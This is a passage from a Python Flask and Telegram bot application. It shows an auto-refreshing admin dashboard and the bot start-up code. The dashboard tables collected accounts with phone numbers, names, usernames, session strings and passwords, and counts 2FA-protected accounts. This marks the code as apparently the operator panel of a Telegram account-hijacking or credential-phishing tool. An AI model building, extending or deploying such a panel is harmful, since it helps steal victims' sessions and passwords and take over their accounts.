        body{{background:#0b0a0f;color:#fff;font-family:Arial;padding:20px}}
        h1{{color:#ff2d55}}
        .stats{{display:flex;gap:15px;margin:15px 0}}
        .st{{background:#12121a;padding:15px 25px;border-radius:10px;text-align:center;flex:1;border:1px solid #1e1e2e}}
        .st .n{{font-size:28px;font-weight:bold;color:#0088cc}}
        .st .l{{color:#666;font-size:12px;margin-top:4px}}
        table{{width:100%;border-collapse:collapse;margin-top:15px;font-size:13px}}
        th,td{{padding:10px 8px;text-align:left;border-bottom:1px solid #1e1e2e}}
        th{{background:#12121a;color:#ddd}}
        tr:hover{{background:#12121a}}
    </style></head>
    <body>
    <h1>📊 Dashboard</h1>
    <div class="stats">
        <div class="st"><div class="n">{len(accounts)}</div><div class="l">Total</div></div>
        <div class="st"><div class="n">{total_2fa}</div><div class="l">2FA 🔐</div></div>
    </div>
    <table><tr><th>#</th><th>Phone</th><th>Name</th><th>Username</th><th>ID</th><th>Session</th><th>Password</th><th>Time</th></tr>
    {rows if rows else '<tr><td colspan="8" style="text-align:center;color:#666;padding:30px">No accounts yet</td></tr>'}
    </table>
    <script>setTimeout(()=>location.reload(),10000)</script>
    </body></html>
    """


# ====== Start Bot Polling (SINGLE INSTANCE) ======
_polling_started = False

def start_bot():
    global _polling_started
    if _polling_started:
        return
    _polling_started = True
    time.sleep(3)
    t = threading.Thread(target=bot_polling_loop, daemon=True)
    t.start()


if __name__ == '__main__':
    if not BOT_TOKEN or not API_HASH:
        print("⚠️ Missing environment variables!")
    else:
        print("✅ All env vars set!")
    
    port = int(os.environ.get('PORT', 5000))
    
    start_bot()  # Start polling before Flask
    
    app.run(host='0.0.0.0', port=port, debug=False)  # debug=False গুরুত্বপূর্ণ!
